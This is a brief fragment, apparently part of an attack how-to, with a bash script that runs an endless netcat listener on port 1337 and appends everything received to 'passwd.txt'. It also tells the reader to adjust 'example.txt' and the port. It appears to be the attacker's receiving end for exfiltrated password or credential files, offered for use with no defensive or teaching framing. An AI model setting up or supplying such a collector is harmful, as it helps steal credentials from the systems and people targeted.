you need to change the example.txt and port if you wish!

to listen in your machine use this script
#!/bin/bash
while [ true ]
do
netcat -vlp 1337 &>> passwd.txt
done

